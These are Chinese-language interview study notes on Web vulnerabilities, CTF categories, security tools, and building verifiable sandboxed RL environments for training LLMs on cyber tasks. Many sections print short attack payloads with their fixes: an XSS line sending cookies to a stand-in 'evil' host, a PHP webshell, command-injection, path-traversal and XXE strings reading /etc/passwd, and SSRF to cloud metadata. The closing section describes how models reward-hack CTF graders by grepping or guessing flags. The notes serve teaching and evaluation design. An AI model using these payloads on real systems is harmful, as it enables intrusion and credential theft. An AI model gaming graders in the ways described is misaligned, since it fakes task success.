# 知识补齐笔记：Web/AppSec 基础 + CTF 任务直觉

这份笔记的目标读者是你，一个懂大模型后训练但不熟安全的人。每一节先把安全知识本身讲清楚到能接住追问，再从"怎么把它变成训练/评估大模型的可验证任务"这个角度过一遍。岗位不要求你会打进真实系统，要求你能对着一道题说清楚它考什么、怎么解、怎么做成一个能自动打分且模型骗不过去的环境。

## 一、Web 漏洞

先建立一个统一的思维框架，后面每个漏洞都是它的实例。绝大多数 Web 漏洞的根因是同一件事：程序把"数据"当成了"指令/结构"来处理，或者反过来信任了本不该信任的输入。攻击者控制了某段输入，这段输入越过了数据的边界，进入了 SQL 语句、HTML 文档、系统命令、文件路径、序列化对象或模板引擎的解析过程。修复的通用方向也就两类，一是让数据永远待在数据的位置（参数化、转义、白名单），二是最小权限和纵深防御，让即使越界了也打不出效果。

下面逐个讲。每个给：一句话原理、一个最小利用例子、根因、修复。

### 1. SQL 注入（SQLi）

原理：用户输入被拼进 SQL 语句，输入里的引号和关键字改变了语句结构。

最小例子：后端写 `SELECT * FROM users WHERE name='$name'`，攻击者传 `name = ' OR '1'='1`，语句变成 `WHERE name='' OR '1'='1'`，恒真，返回全部用户。登录场景里传 `admin'--`，把密码校验部分注释掉直接登入。

利用的深入形态需要知道：

| 类型 | 特征 | 典型手法 |
|---|---|---|
| 联合注入 union-based | 页面直接回显查询结果 | `UNION SELECT username,password FROM users`，先用 `ORDER BY n` 试列数 |
| 报错注入 error-based | 页面回显数据库报错 | 用 `extractvalue`、`updatexml` 把数据塞进报错信息 |
| 布尔盲注 boolean-blind | 页面只有真假两种表现 | `AND substr(database(),1,1)='a'`，逐字符二分猜 |
| 时间盲注 time-blind | 页面无任何回显差异 | `AND IF(条件, sleep(5), 0)`，靠响应延迟判断真假 |
| 堆叠注入 stacked | 允许多语句 | `; DROP TABLE ...` 或写 webshell |

根因：字符串拼接构造 SQL，数据和代码同处一个字符串。

修复：用参数化查询/预编译语句（prepared statement），数据以参数形式绑定，永远不参与 SQL 解析。ORM 默认走这条路。输入校验和最小数据库权限是补充，不是替代。注意存储过程内部拼接一样会中招。

### 2. XSS 跨站脚本

原理：攻击者的 JavaScript 被浏览器当作页面自身的脚本执行，从而在受害者浏览器里以受害者身份行动（偷 cookie、发请求、改页面）。核心是恶意脚本进了 HTML 上下文。分三种，区别在恶意脚本从哪来、存哪。

反射型 reflected：脚本在请求参数里，服务器原样反射进响应页面。例子：`search?q=<script>alert(1)</script>`，服务器把 `q` 直接写进结果页。需要诱导受害者点一个构造好的链接，一次性。

存储型 stored：脚本被存进数据库（评论、昵称、留言），每个访问该页的人都中招。危害最大，因为不需要诱导点击，且可蠕虫式传播。

DOM 型 DOM-based：漏洞完全在前端 JavaScript，服务器可能根本没参与。例子：前端 `document.write(location.hash)` 或 `element.innerHTML = 用户输入`，脚本从 URL 片段进入 DOM 而没经过服务器。特征是"看服务器响应找不到 payload"，要审前端代码。

利用要点：真实攻击里 `alert(1)` 只是证明存在，实战是 `<script>fetch('//evil/'+document.cookie)</script>` 偷会话，或用 XSS 打 CSRF token 从而绕过 CSRF 防护。

根因：把不可信数据插入 HTML 时没有按所处上下文正确编码。

修复：输出编码是主线，且必须按上下文来（HTML 正文用 HTML 实体编码，属性值、JS 字符串、URL 各有各的编码规则）。前端优先用 `textContent` 而非 `innerHTML`。部署 CSP（Content-Security-Policy）作为纵深防御，限制脚本来源、禁内联脚本。cookie 设 `HttpOnly` 让 JS 读不到，缩小 XSS 偷 cookie 的收益。现代框架（React/Vue）默认转义，但 `dangerouslySetInnerHTML`、`v-html` 会绕过。

### 3. CSRF 跨站请求伪造

原理：浏览器发请求会自动带上目标站的 cookie。攻击者让受害者的浏览器在受害者已登录的状态下，向目标站发出一个受害者本不想发的请求。攻击者看不到响应，但请求以受害者身份执行了。

最小例子：受害者登录着银行网站，访问了攻击者页面，页面里有 `<img src="https://bank/transfer?to=attacker&amount=1000">`，浏览器自动带 cookie 发出这个转账请求。POST 场景用一个自动提交的隐藏表单。

根因：服务器仅凭自动携带的 cookie 判断请求合法，无法区分"用户主动发起"和"第三方页面诱发"。

修复：CSRF token，服务器给每个表单发一个不可预测的一次性令牌，攻击者跨站时拿不到这个值。SameSite cookie 属性（`Lax`/`Strict`）让 cookie 在跨站请求时不自动发送，是现代浏览器的默认防线。对敏感操作校验 Origin/Referer 头。注意 CSRF 和 XSS 的关系：站内有 XSS 时 CSRF 防护基本失效，因为攻击者能在站内读到 token。

### 4. SSRF 服务端请求伪造

原理：服务器提供了一个"帮你去请求某个 URL"的功能（拉取远程图片、webhook、URL 预览），攻击者把 URL 换成内网地址，让服务器代替自己去访问外部访问不到的东西。

最小例子：功能是 `fetch?url=...`，攻击者传 `url=http://169.254.169.254/latest/meta-data/`，让服务器去访问云厂商的元数据接口，读出临时凭证。或者 `url=http://127.0.0.1:6379/` 打内网 Redis。

根因：服务器无条件相信用户给的 URL 并主动发起请求，攻击者借用了服务器的网络位置。

修复：对目标地址做白名单（只允许特定域名/IP），解析 DNS 后校验解析结果是否落在内网段（防 DNS rebinding，即域名先解析成公网 IP 过检查、再解析成内网 IP 被访问）。禁用重定向跟随或对重定向后地址重新校验。禁止访问链路本地地址和私有网段。云上给元数据服务加 IMDSv2。SSRF 在云环境里危害极大，因为它常常是拿到云凭证的入口。

### 5. 命令注入

原理：用户输入被拼进操作系统命令行执行。

最小例子：后端 `ping -c 1 $host`，攻击者传 `host = 8.8.8.8; cat /etc/passwd`，分号后面的命令一并执行。其他分隔符 `|`、`&&`、`` `cmd` ``、`$(cmd)` 同理。

根因：把用户输入交给 shell 解释执行，shell 元字符改变了命令结构。

修复：不要拼 shell 命令。用语言提供的、直接调用可执行文件并以数组传参的接口（如 `execve` 风格，参数不经过 shell 解析）。必须用外部命令时对参数严格白名单。这和 SQL 注入是同构的问题，同构的解法：让数据不进入解释器的语法层。

### 6. 路径穿越 / LFI

原理：用户输入被当作文件路径，`../` 让程序访问预期目录之外的文件。LFI（本地文件包含）是它在"包含并执行文件"场景下的加强版。

最小例子：`download?file=report.pdf`，攻击者传 `file=../../../../etc/passwd`。PHP 里 `include($_GET['page'])` 传 `page=../../../../etc/passwd` 就是 LFI，若能配合日志投毒或 `php://filter`、`data://` 伪协议还能升级为代码执行。

根因：用户输入直接参与文件路径构造，没有限制在允许的目录内。

修复：把用户输入当纯文件名，剥离路径分隔符，用白名单映射（用户传 id，服务器查表得到真实路径）。规范化路径后校验它仍在允许目录内（防 `....//` 等绕过）。最小文件系统权限。

### 7. 文件上传

原理：允许上传文件的功能，若能上传可执行脚本并让服务器执行它，就是 getshell。

最小例子：上传 `shell.php`（内容 `<?php system($_GET['c']);?>`）到 web 目录，再访问它，就能在服务器执行任意命令。绕过手法围绕"骗过类型校验"：改扩展名、伪造 Content-Type、构造双扩展名 `a.php.jpg`、利用解析漏洞、在图片里塞 PHP 代码（图片马）。

根因：对上传文件的类型、内容、存放位置、可执行性控制不足。

修复：扩展名和 MIME 走白名单，服务端按文件内容而非用户声明判断类型。重命名文件、去掉可控扩展名。上传目录不给执行权限，最好放到 web 根目录之外或独立的对象存储域名。

### 8. SSTI 服务端模板注入

原理：用户输入被拼进服务端模板字符串，模板引擎把它当模板语法解析，攻击者借模板语法访问对象和方法，通常能升级到远程代码执行。

最小例子：Flask/Jinja2 里 `render_template_string("Hello "+name)`，传 `name={{7*7}}`，页面回显 `49`，说明进了模板求值。进一步 `{{ ''.__class__.__mro__[1].__subclasses__() }}` 一路找到能执行命令的对象。识别信号就是 `{{7*7}}` 变成 49、`${7*7}`、`<%= 7*7 %>` 这类被求值。

根因：用户输入拼进了模板本身，而不是作为模板的数据传入。

修复：模板只用固定字符串，用户数据永远走数据参数传入（`render_template(tpl, name=name)`），绝不拼进模板文本。用沙箱化的模板引擎、限制可访问的属性。

### 9. 反序列化漏洞

原理：程序把不可信的字节流反序列化还原成对象，攻击者构造恶意序列化数据，在反序列化过程中触发对象的魔术方法/回调，串成一条能执行代码的调用链（gadget chain）。

最小例子：Java 里对不可信数据调用 `ObjectInputStream.readObject()`，配合 commons-collections 等库里的现成 gadget 链达成 RCE。PHP 的 `unserialize()` 触发 `__wakeup`/`__destruct`。Python 的 `pickle.loads` 直接可执行任意代码。

根因：反序列化会自动重建对象状态并可能触发代码路径，而输入不可信。

修复：不要反序列化不可信数据。需要传结构化数据就用 JSON 这类只描述数据、不承载行为的格式。必须用原生序列化时做类型白名单、签名校验。

### 10. 认证与会话缺陷（JWT、session）

这一类不是单一漏洞，是一组围绕"如何证明你是谁、如何维持登录态"的错误。

Session（服务端会话）：登录后服务器发一个随机 session id 存 cookie，状态存服务器。常见问题：session id 可预测、登录后不换 id（会话固定攻击 session fixation）、退出不失效、cookie 没设 `HttpOnly`/`Secure`/`SameSite`。

JWT（无状态令牌）：令牌自带内容和签名，服务器不存状态，靠验签判断真伪。结构是 `header.payload.signature`，三段 base64url，payload 是明文可解码（不是加密，别往里放秘密）。典型漏洞：

| 漏洞 | 成因 |
|---|---|
| `alg: none` | 服务端接受"无签名"算法，攻击者去掉签名任意改 payload |
| 算法混淆 RS256→HS256 | 服务端用公钥当 HMAC 密钥验签，攻击者用已知公钥伪造签名 |
| 弱密钥 | HMAC 密钥可爆破（如 `secret`），爆出来就能任意签发 |
| 不校验过期/未验签 | 令牌永久有效或根本没验 |

修复：session id 用密码学随机数、登录后重置、退出即失效、cookie 三属性齐全。JWT 固定并强制校验算法、用强密钥、校验 `exp`、敏感操作别只靠无状态令牌（无法即时吊销）。

### 11. 访问控制缺陷（IDOR / 越权）

原理：系统校验了"你登录了没"（认证），却没校验"这个资源是不是你的"（授权）。

最小例子（IDOR，不安全的直接对象引用）：`GET /order?id=1001` 能看自己的订单，把 id 改成 1002 就看到别人的订单，因为后端只按 id 查、没校验归属。这叫水平越权（访问同级别其他用户的数据）。垂直越权是普通用户访问了管理员功能，比如直接请求 `/admin/deleteUser`。

根因：每个请求缺少"当前用户是否有权操作这个具体资源"的服务端校验。

修复：每次访问对象都做归属和权限校验，且必须在服务端，绝不靠前端隐藏入口。用不可枚举的标识（UUID）能提高门槛但不是根治，根治是服务端强制校验。这类漏洞自动扫描器很难发现，因为技术上请求完全合法，只有理解业务才知道越权，这一点在后面"评估大模型"部分很关键。

### 12. XXE XML 外部实体注入

原理：XML 解析器允许定义并解析外部实体，攻击者在 XML 里定义一个指向本地文件或内网地址的实体，解析时被读取或请求。

最小例子：提交的 XML 里写 `<!DOCTYPE x [<!ENTITY e SYSTEM "file:///etc/passwd">]><data>&e;</data>`，解析后 `&e;` 被替换成文件内容回显。也能用 `SYSTEM "http://内网"` 打成 SSRF，或用参数实体做盲注外带。

根因：XML 解析器默认开启外部实体解析，且处理了不可信 XML。

修复：关闭 DTD 和外部实体解析（各语言解析器都有对应开关，如 `disallow-doctype-decl`）。能用 JSON 就别用 XML。

### OWASP Top 10 串一遍（2021 版）

这是行业公认的 Web 风险清单，面试常问你能不能背出框架并对上前面的漏洞。

| 编号 | 类别 | 对应上面 |
|---|---|---|
| A01 | 访问控制失效 | IDOR、越权 |
| A02 | 加密机制失效 | 明文存密码、弱加密、JWT 弱密钥 |
| A03 | 注入 | SQLi、XSS、命令注入、SSTI |
| A04 | 不安全设计 | 架构层缺陷，如缺少限流、业务逻辑漏洞 |
| A05 | 安全配置错误 | 默认口令、目录列表、XXE、暴露的管理面板 |
| A06 | 易受攻击和过时的组件 | 用了有已知漏洞的依赖库 |
| A07 | 身份认证失效 | 弱口令、会话缺陷、无爆破防护 |
| A08 | 软件和数据完整性失效 | 不安全反序列化、供应链、CI/CD 投毒 |
| A09 | 安全日志和监控失效 | 出事了发现不了、查不到 |
| A10 | SSRF | 服务端请求伪造，单列一类 |

要点：A03 注入把多个注入类归到一起，XSS 在 2021 版被并入注入。A10 SSRF 是应社区投票新增单列，说明它在云时代重要性上升。

### 面试官可能怎么问 / 怎么答

问：SQL 注入和 XSS 的根因是不是一回事？
答：抽象层面是同一类，都是数据越界进入了某个解释器的语法层，SQLi 进的是 SQL 解析器，XSS 进的是浏览器的 HTML/JS 解析器。所以解法也同构，都是让数据待在数据位置：SQLi 用参数化，XSS 用上下文相关的输出编码。区别在于执行发生的位置，SQLi 在服务端数据库，XSS 在受害者浏览器，因此 XSS 的危害绑定的是会话和用户身份。

问：CSRF 和 XSS 有什么关系，防了一个是不是就防了另一个？
答：不是，是两个正交的问题。XSS 是执行了攻击者的脚本，CSRF 是伪造了用户的请求且攻击者看不到响应。但有耦合：站内存在 XSS 时，CSRF token 防护会失效，因为攻击者能用 XSS 在站内直接读到 token。所以 XSS 常被当作"元漏洞"，它能撬动很多其他防线。

问：JWT 里能不能放敏感信息？
答：不能。JWT 的 payload 只是 base64url 编码，不是加密，任何人都能解开看到。签名只保证不可篡改，不保证机密性。要机密就得额外加密（JWE）或者根本别放。另一个高频坑是 `alg:none` 和 RS256/HS256 算法混淆，所以服务端必须固定并强制校验算法，不能信任令牌头里声明的算法。

问：IDOR 这种越权为什么自动化扫描器难发现？
答：因为越权请求在技术上完全合法，语法正确、认证通过，扫描器没有"这条数据该归谁"的业务语义，无法判断 id=1002 不属于当前用户。它本质是授权逻辑缺失，需要理解业务模型才能识别。这一点对我们做大模型评估很有意义，它意味着这类漏洞很难用简单的模式匹配去判定，模型要真正理解应用状态才能发现，也更难被打分脚本简单验证。

## 二、CTF 题型直觉

CTF（夺旗赛）的通用目标是拿到一个 flag，一段格式固定的字符串，通常长这样 `flag{...}` 或 `picoCTF{...}`、`XXXX{...}`，提交到平台换分。两种赛制：Jeopardy（解题制，按题型分类，各自独立，训练大模型主要用这种）和 Attack-Defense（攻防对抗，各队互攻同时补自己的洞）。下面按题型给直觉。

### Web

考什么：前面第一节那套 Web 漏洞的实战识别与利用，外加对 HTTP 协议、前后端交互、常见框架行为的熟悉。

拿到题先看什么：先看功能和源码（很多 Web 题给源码，没给就先摸接口）。看有没有用户输入进了 SQL、模板、命令、文件路径、反序列化。看 cookie 和登录逻辑（JWT 弱密钥、session 问题）。看有没有源码泄露（`.git` 目录、`.bak` 备份、注释、`robots.txt`）。用 burp 抓包看真实请求。

常用工具：burp（抓改包）、sqlmap（自动化注入）、gobuster/ffuf（爆目录和文件）。

flag 通常在哪：数据库某张表里、服务器某个文件里（`/flag`、`/flag.txt`）、管理员账户登录后可见、或 RCE 后在文件系统里找。

### Pwn 二进制利用

考什么：对内存布局和程序执行流的理解，利用内存破坏漏洞劫持控制流，通常给一个可交互的二进制程序（远程有一个服务端跑着它），目标是让它执行你的代码或调用出 shell。这是 CTF 里门槛最高、最能体现"长程推理"的一类，对你这个岗位很值得懂。

先建立内存模型：进程内存里，栈从高地址向低地址增长，存局部变量和函数返回地址；堆存动态分配的内存；代码段和数据段固定。函数调用时返回地址被压栈，控制流的关键就是这个返回地址。

主要漏洞类型：

栈溢出：往栈上缓冲区写入超过其大小的数据，覆盖了相邻的返回地址。例子：`char buf[64]` 用 `gets(buf)` 读入，输入超过 64 字节就能覆盖返回地址，把它改成你想跳去的地址。经典目标是跳到程序里的 `system("/bin/sh")` 或自己布置的 shellcode。

堆漏洞：围绕堆管理器（glibc 的 ptmalloc）的错误使用，如释放后使用（use-after-free，free 了还继续用那块内存）、重复释放（double free）、堆溢出。利用手法是操纵堆的空闲链表（fastbin/tcache），骗分配器把一块内存分配到攻击者想要的地址，从而实现任意地址写。堆题是 pwn 里最深的分支，手法随 glibc 版本演进（tcache poisoning、house of 系列）。

格式化字符串：程序把用户输入直接当作 `printf` 的格式串，如 `printf(user_input)` 而非 `printf("%s", user_input)`。攻击者传 `%x` 泄露栈上数据、`%s` 读任意地址、`%n` 往任意地址写值。既能泄露信息（绕 ASLR/canary）又能任意写。

ROP 返回导向编程：现代系统栈不可执行（NX），没法直接注入 shellcode 执行。ROP 绕过它：不注入代码，而是把程序里已有的一小段以 `ret` 结尾的指令片段（gadget）串起来，用栈上布置的一串返回地址驱动执行，拼出想要的操作（如调用 `execve`）。ret2libc 是其特例，直接返回到 libc 里的 `system`。

常见缓解机制和绕过思路：

| 缓解 | 作用 | 绕过思路 |
|---|---|---|
| NX / DEP | 栈/堆不可执行，堵死注入 shellcode | ROP / ret2libc，复用已有代码 |
| ASLR | 随机化内存基址，让你不知道跳去哪 | 先泄露一个地址（格式化字符串、越界读）算出基址 |
| Stack Canary | 返回地址前放一个随机值，函数返回前校验，改动即崩溃 | 泄露 canary 值再溢出、或绕过校验路径 |
| PIE | 连程序自身代码基址也随机化 | 泄露一个代码指针算出基址 |
| RELRO | 保护 GOT 表不被改写 | 打其他可写目标 |

所以现代 pwn 的典型流程是：先找一个信息泄露把某个随机地址读出来，算出 libc/程序基址，再用溢出配合 ROP 把控制流引到 `system("/bin/sh")`。这条"先泄露再利用"的两阶段结构，是 pwn 长程推理的核心，也是它作为 agentic 任务价值高的原因，一步错则全盘错。

常用工具：pwntools（写利用脚本的 Python 库，收发数据、打包地址、生成 ROP 链）、gdb 配 pwndbg/gef 插件（动态调试、看内存和寄存器）、Ghidra/IDA（反编译看逻辑）、checksec（一眼看开了哪些缓解）、one_gadget（找 libc 里一步起 shell 的地址）、ROPgadget（找 gadget）。

flag 通常长什么样：pwn 题拿到 shell 后 `cat /flag`，flag 是文件内容。

### Reverse 逆向

考什么：读懂一个不给源码的二进制/字节码在做什么，通常要还原出它的校验逻辑，构造出能通过校验的输入（那个输入或其变换就是 flag），或者直接从程序里把 flag 抠出来。

拿到题先看什么：先 `file` 看类型，`strings` 扫可见字符串（有时 flag 或提示直接在里面）。然后丢进反编译器看逻辑，重点找那个"比较输入和目标"的地方。常见套路是程序对输入做一系列变换（异或、加法、置换）再和一个常量数组比较，逆着这个变换就能算出正确输入。

常用工具：Ghidra（免费反编译器，NSA 出的）、IDA（商业，反编译强）、`strings`、`ltrace`/`strace`（看调用）、angr（符号执行，自动求解满足条件的输入，逆向题的自动化利器）。

flag 通常长什么样：算出的正确输入本身就是 flag，或程序验证通过后打印 flag。

（这一段和你解的 newyear_keygen2、tris_crackme 直接对应：你就是读懂了 crackme 的校验逻辑，还原出 TEA 变体加自定义 MD5 的算法，逆着算出正确注册码。面试讲逆向题时用你这个真实例子最有说服力。）

### Crypto 密码学

考什么：识别密码方案的误用，用数学弱点还原明文或密钥。CTF crypto 几乎不考"暴力破解正确实现的强密码"，考的是实现或参数用错了留下的可解弱点。你只需认得住常见弱点模式：

| 弱点 | 原理 | 解法 |
|---|---|---|
| 弱 RSA | 模数 N 太小或两素数太接近 | 分解 N（factordb 查已知分解、Fermat 分解近素数），得私钥 |
| RSA 小指数 e=3 | 明文小时 `m^3 < N`，没取模 | 直接开三次方 |
| RSA 共模/相关消息 | 同一 N 或相关明文加密 | 共模攻击、Franklin-Reiter |
| ECB 模式 | 相同明文块加密成相同密文块，泄露结构 | 分块重排、cut-and-paste 伪造 |
| 已知明文 | 知道部分明文 | 对流密码/异或直接推出密钥流 |
| nonce 复用 | 一次性随机数被重复用（如 CTR 模式、ECDSA 签名） | ECDSA 复用 nonce 可解出私钥，CTR 复用可异或消去密钥流 |
| 弱随机数 | 用可预测的种子/PRNG（如 Mersenne Twister） | 恢复内部状态、预测后续输出 |

拿到题先看什么：看给了什么（N、e、c 就是 RSA；有 IV 和分组就是分组密码），看参数有没有异常（e 特别小、N 特别小、nonce 出现两次）。RSA 题先把 N 丢 factordb 试。

（这段的"已知明文"正是你在 ghidra_malware 题里用的：配置块被 XOR 加密，你拿已知的魔数 `BEACON01` 加 C2 IP 前缀做已知明文，异或出 16 字节密钥。这就是已知明文攻击的教科书例子，面试可以直接讲。）

常用工具：Python 的 `pycryptodome`、SageMath（做数论运算的重武器）、factordb（在线查大数分解）、CyberChef（编码变换和常见密码的可视化处理）。

flag 通常长什么样：解出的明文就是 flag。

### Forensics 取证

考什么：从数据载体里把隐藏或删除的信息挖出来。三个主要方向：

流量取证：给一个抓包文件（pcap），从里面还原出传输的内容，如登录凭证、传输的文件、隐藏在协议字段里的数据。用 Wireshark 打开，追踪 TCP 流，用 `File > Export Objects` 导出传输的文件，用过滤器找可疑流量。

内存取证：给一个内存镜像，还原当时运行的进程、命令历史、密码、注入的恶意代码。用 volatility 框架，先识别镜像的 profile，再列进程、看命令行、dump 可疑进程。

磁盘取证：给一个磁盘/文件系统镜像，找删除的文件、隐藏分区、文件里的隐写内容。用 `binwalk` 找嵌套文件、`foremost`/`photorec` 按文件头恢复删除文件、`strings` 扫。

隐写常和取证放一起：信息藏在图片的低位、文件末尾、元数据里。工具有 `steghide`、`zsteg`、`exiftool`、`stegsolve`。

拿到题先看什么：先 `file` 和 `binwalk` 确认这到底是什么、里面有没有藏别的文件。然后按载体类型选工具。

（这段的流量取证正是你做的 pcap_enterprise_triage：你用 tshark 从 50MB 抓包里挑出受害主机 10.12.17.101，看 DNS 查询定位恶意域名，从 `geo.netsupportsoftware.com` 认出 NetSupport RAT 家族。面试讲取证题用这个例子。）

### Misc 杂项

考什么：不属于上面任何一类的都归这里。包括编码解码（base64/base32/十六进制/摩斯/各种进制）、二维码、隐写、脚本自动化交互（远程给你出一堆数学题限时答完）、OSINT（开源情报，靠公开信息定位）、esolang（奇葩编程语言）。

拿到题先看什么：先辨认这是哪种，一串看不懂的字符先怀疑编码，丢 CyberChef 用它的"Magic"功能自动识别多层编码。要求快速大量交互的用 pwntools 写脚本。

flag 通常长什么样：解码到底就是 flag，或脚本答对所有题后服务器返回 flag。

### 面试官可能怎么问 / 怎么答

问：现代 pwn 题为什么大多是"两阶段"？
答：因为缓解机制堆叠。NX 让你不能注入并执行 shellcode，逼你用 ROP 复用已有代码；ASLR/PIE 又把地址随机化，让你不知道 ROP 的目标在哪。所以标准结构是第一阶段先制造一个信息泄露把某个随机化地址读出来、算出基址，第二阶段再用溢出加 ROP 精确劫持控制流。这个结构对 agent 任务是强信号，它要求模型维持长程状态、把前一步泄露的地址喂给后一步，中间任何一步偏差都不出 flag，没法靠猜蒙混。

问：CTF 的 crypto 和真实密码学攻击差别在哪？
答：CTF crypto 基本不打正确实现的强算法，它给你的是被用错了的场景，参数选得太小、模式选得不对（ECB）、随机数复用、部分明文已知。考点是你能不能识别出这个误用模式并套用对应的已知攻击。真实世界的密码攻击更多是侧信道、协议层缺陷和实现 bug，纯数学破解强算法基本不现实。

问：给你一道逆向题你会怎么下手？
答：先 `file` 和 `strings` 做零成本侦察，flag 或关键提示有时直接躺在字符串里。然后反编译找校验逻辑，定位输入和目标常量比较的位置，判断中间做了什么可逆变换，逆过去求出输入。如果变换复杂到手推困难，上 angr 做符号执行，把"输出等于目标"设成约束让求解器自动解出输入。我上个项目里就手工逆过一个 crackme，还原出 TEA 变体加自定义 MD5 的注册码算法，逆着算出了正确注册码。

## 三、工具地图

一句话说清每个工具是干什么的、什么场景下上手。

| 工具 | 用途与典型场景 |
|---|---|
| Burp Suite | Web 抓包改包代理。所有 Web 题的基础，拦截浏览器请求、逐字段篡改、重放（Repeater）、爆破（Intruder）、看完整 HTTP 交互。手工挖 Web 漏洞的主力台。 |
| sqlmap | 自动化 SQL 注入。给它一个可疑参数或抓好的请求，它自动探测注入类型、拖库、甚至拿 shell。省掉手写盲注的逐字符猜解。 |
| nmap | 端口和服务扫描。摸清目标开了哪些端口、跑什么服务什么版本，是攻防和渗透的第一步侦察。 |
| gobuster / ffuf | 目录和文件爆破（fuzzing）。用字典猜出网站上没有链接指向的隐藏路径、备份文件、后台入口。ffuf 更快更灵活，还能 fuzz 参数和子域名。 |
| pwntools | 写 pwn/交互脚本的 Python 库。负责和远程服务收发数据、把地址按字节序打包、生成 ROP 链、开调试。几乎所有 pwn 题的 exploit 都用它写。 |
| gdb + pwndbg | 动态调试器加增强插件。运行时看寄存器、栈、堆、内存，单步跟踪，pwndbg/gef 把这些信息可视化，是调 pwn exploit 的核心环境。 |
| Ghidra / IDA | 反汇编与反编译。把二进制还原成接近 C 的伪代码看逻辑，逆向和 pwn 找漏洞都靠它。Ghidra 免费，IDA 商业但反编译更强。 |
| Wireshark / tshark | 流量分析。打开 pcap 看每个数据包，追踪会话，导出传输的文件。tshark 是它的命令行版，便于脚本化批量处理。流量取证的主力。 |
| CyberChef | 浏览器里的编码/加密/数据变换瑞士军刀。把多层 base64、异或、进制转换、常见密码用可拖拽的流程串起来处理，Magic 功能能自动猜编码。Misc 和快速数据处理常用。 |
| volatility | 内存取证框架。从内存镜像里解析出进程列表、网络连接、命令历史、注入代码、提取文件。内存取证题基本等于用 volatility。 |

补充几个常出现但没单列的：`checksec`（看二进制开了哪些缓解）、`strings`/`file`/`binwalk`（零成本侦察，任何二进制题先跑）、`nc`（裸连接远程服务）、angr（符号执行自动求解）、`hashcat`/`john`（离线爆破口令哈希）。

### 面试官可能怎么问 / 怎么答

问：如果要给大模型配一套 cyber 工具，你会怎么选？
答：按题型的工具依赖度和可脚本化程度分。Web 和 crypto、misc 更依赖能写代码和发 HTTP，给它一个能跑 Python（带 requests、pwntools、pycryptodome）和 shell 的沙箱，覆盖面最广。pwn/reverse 依赖交互式调试和反编译，工具链重、GUI 多，自动化难度大，需要把 gdb、Ghidra 的能力包装成命令行可调用的接口喂给模型。选工具时优先选有稳定命令行、输出可解析的，因为模型要靠读工具输出做下一步决策，GUI-only 的工具（如纯图形的 IDA、burp 手工界面）对 agent 不友好，这也和我项目里那几个 Windows-GUI 任务 Linux sandbox 跑不了是同一个问题。

问：sqlmap 这种全自动工具，用来评估模型是不是就没意义了？
答：要看你评估什么。如果只是要模型"拿到 flag"，允许它调 sqlmap 是合理的，正如人类选手也会用。但如果目标是评估模型的漏洞理解和推理能力，全自动工具会把能力信号抹平，一句 `sqlmap -u ... --dump` 就出结果，看不出模型懂不懂。这时要么禁用重度自动化工具只留基础能力，要么设计 sqlmap 直接打不动、必须手工绕过的题，把推理逼出来。

## 四、从训练/评估大模型的视角看这些任务

这是岗位的核心。前面的安全知识是底座，这一节是你要真正贡献的地方：怎么把一道 cyber 题变成沙箱里可复现、可自动打分、且模型骗不过去的环境，用来做 RL 训练或 benchmark 评估。

### 4.1 可验证性：三种打分方式

cyber 任务相对其他 agentic 任务的最大优势就是可验证性强，很多题有明确的成功信号。但"可验证"有三个层次，粒度和难度递增：

Flag 精确匹配。题目成功等价于拿到一个固定字符串，verifier 就是把模型的输出和标准 flag 做字符串比较。优点是判定零歧义、零成本、可自动化。绝大多数 Jeopardy 题天然属于这类，也是最适合做 RL reward 的形态（reward 是干净的 0/1）。局限是它只验证"结果"，不验证"过程对不对"，模型可能用非预期方式拿到 flag。

状态检查。有些任务的目标不是一个字符串，而是让系统进入某个状态，比如"拿到 root shell"、"某文件被创建"、"某服务被攻陷"。verifier 要去检查环境状态，如探测某端口是否起了 shell、某文件内容是否被改成预期、数据库某条记录是否被越权修改。比 flag 匹配复杂，需要为每题写状态探针，但能覆盖没有天然 flag 的任务（尤其攻防、提权、真实漏洞复现）。

输出打分 / 富评判。当任务没有离散的成功状态时，比如"写一份漏洞分析"、"给出修复补丁"、"判断这段代码有没有洞"，就得对开放输出打分。手段有单元测试/漏洞是否真的被补上（可执行验证，仍偏客观）、或用一个模型当裁判（LLM-as-judge，主观但可扩展）。这类打分噪声大、可被利用，是最难做对的一层。

设计任务时的优先级：能用 flag 匹配就用，能用状态检查就别上模型裁判。可验证性越硬，RL 信号越干净，越不容易被 reward hacking。

（你解的 4 道题正好覆盖这三种：ghidra_malware 和 pcap 是按输出文件字段打分（介于状态检查和富评判之间，字段级连续分），newyear_keygen2 是 flag 精确匹配，tris_crackme 是 Windows 注册表状态检查。面试讲这一节时，用你亲手对过分的这四道题当例子，非常有说服力。）

### 4.2 怎么把一道题做成可复现可打分的沙箱环境

一道能用于训练的 cyber 任务，至少要满足：环境可复现、每次重置到同一初始状态、成功信号可自动读取、和外网隔离。落地要素：

容器化和隔离。每题打包成一个容器镜像（题目服务 + 依赖），保证任何机器上拉起来行为一致。必须网络隔离，一是防模型逃逸真去打外网，二是防评测受外部影响不可复现。给模型一个受控的攻击机沙箱，它在里面执行命令、跑工具。

可重置和幂等。每个 episode 开始把环境重置干净，flag 位置和内容确定或按种子生成。若模型上一轮改坏了环境，下一轮必须是全新的初始态，否则 RL 的样本之间会相互污染。

Flag 的生成与注入。为防作弊，flag 最好每次实例化时随机生成并注入到"只有真正解出题才能到达的位置"，而不是硬编码在镜像里到处可 grep（下一节详述）。verifier 持有本轮的正确 flag 做比对。

轨迹可观测。要记录模型执行了哪些命令、拿到什么输出，一方面给 RL 做信用分配和过程奖励，另一方面用来事后审计它是不是走了捷径。

分层反馈。纯 0/1 的 flag reward 在难题上极其稀疏，模型可能全程拿不到任何正信号学不动。可以设计中间里程碑（发现了注入点、拿到了低权限、泄露了地址）给部分奖励，但每加一个中间信号都要问它会不会被刷（见下节），过程奖励是 reward hacking 的高发区。

### 4.3 reward hacking 在 cyber 任务里的具体形态

reward hacking 指模型拿到了奖励但没真正完成任务，用了打分机制的漏洞而非解决了问题。cyber 环境里它有很具体的形态，做环境的人必须预判并堵住：

直接 grep flag。如果 flag 以明文放在容器文件系统里某处，模型可能不去解题，直接 `grep -r flag{ /` 或 `find / -name '*flag*'` 把它捞出来。堵法是 flag 不落在可直接读取的地方，或需要相应权限才能读（flag 文件只有 root 可读，而拿 root 正是题目目标），或运行时才生成注入。

猜 flag / 爆破格式。flag 格式固定（`flag{...}`）时模型可能尝试猜测或枚举提交。堵法是 flag 主体用高熵随机串，猜中概率可忽略；评测里限制提交次数或对乱猜不给任何信号。

